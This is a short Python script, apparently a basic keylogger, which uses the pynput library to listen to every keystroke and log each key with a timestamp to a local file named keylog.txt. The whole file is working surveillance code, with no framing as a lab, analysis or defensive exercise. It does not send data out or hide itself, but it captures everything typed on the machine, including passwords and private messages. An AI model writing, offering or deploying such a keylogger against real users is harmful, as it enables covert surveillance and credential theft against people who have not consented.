from pynput.keyboard import Key, Listener
import logging

#select where to save the log file
log_directory = ""

#select log file name
log_file_name ="keylog.txt"

logging.basicConfig(filename=(log_directory + log_file_name ), level=logging.DEBUG, format='%(asctime)s: %(message)s')
    
def on_press(key):

    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()